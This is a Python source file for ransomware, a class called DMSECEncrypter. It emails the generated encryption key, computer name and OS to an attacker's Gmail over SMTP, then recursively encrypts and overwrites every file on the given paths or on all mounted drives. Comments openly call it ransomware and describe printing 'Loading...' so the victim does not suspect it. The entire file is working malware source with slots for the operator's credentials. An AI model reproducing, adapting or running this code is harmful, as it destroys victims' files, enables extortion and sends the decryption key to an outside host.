import smtplib
from cryptography.fernet import Fernet
from os import walk, environ
from os.path import join
from psutil import disk_partitions


class DMSECEncrypter:
    def __init__(self, paths:list=None, gmail:str=None, passwd:str=None) -> None:
        # generate new key
        self.KEY = Fernet.generate_key()

        # report KEY to the attacker using email
        if gmail!=None and passwd!=None and self.send_mail(mail=gmail, password=passwd):
            pass
        else:
            # print error message and exit if key is not sent
            print('[!] Try Again, Unable to connect')
            exit()

        # generate fernet obj for file encryption
        self.fernet = Fernet(self.KEY)

        if paths == None:
            self.PATHS = self.__get_partitions_path()
        else:
            self.PATHS = paths


    def send_mail(self, mail, password)->bool:
        '''
        sends mail to specific address/addresses.
        '''
        try:
            message =  f'Subject: RNSMWARE ATTK has been initialized on {environ["COMPUTERNAME"]}\n**KEY** {str(self.KEY, encoding="utf-8")}\n**OS** {environ["OS"]}\n\n'
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(mail, password)
            server.sendmail(mail, mail, message)
            server.quit()
            return True
        except Exception as e:
            return False


    def __get_partitions_path(self) -> list:
        '''
        returns all mounted partition's mount points as a list
        '''
        mount_points = []
        for partition in disk_partitions():
            mount_points.append(partition.mountpoint)
        return mount_points


    def encrypt_file(self, file_path):
        try:
            # read file data
            with open(file_path, 'rb') as f:
                file_data = f.read()

            # encrypt file data
            enc_data = self.fernet.encrypt(file_data)

            # write file data
            with open(file_path, 'wb') as f:
                file_data = f.write(enc_data)
            return True

        except Exception:
            return False
        
    
    def encrypt_files(self, path:str):
        for root, dirs, files in walk(path):
            for file in files:
                file_path = join(root, file)
                self.encrypt_file(file_path=file_path)


    def start(self):
        for path in self.PATHS:
            self.encrypt_files(path)


if __name__ == '__main__':
    # Print some meaningful text, so that user don't suspect program as ransomeware 
    print('[*] Loading...')

    # Specify paths to be encrypted
    PATHS = [r'path_to_be_encrypted',]

    # don't pass PATHS if all the drives are to be encrypted
    encrypter = DMSECEncrypter(PATHS, gmail='yourgmailid', passwd='yourapppassword')
    encrypter.start()
    print('[*] Completed')
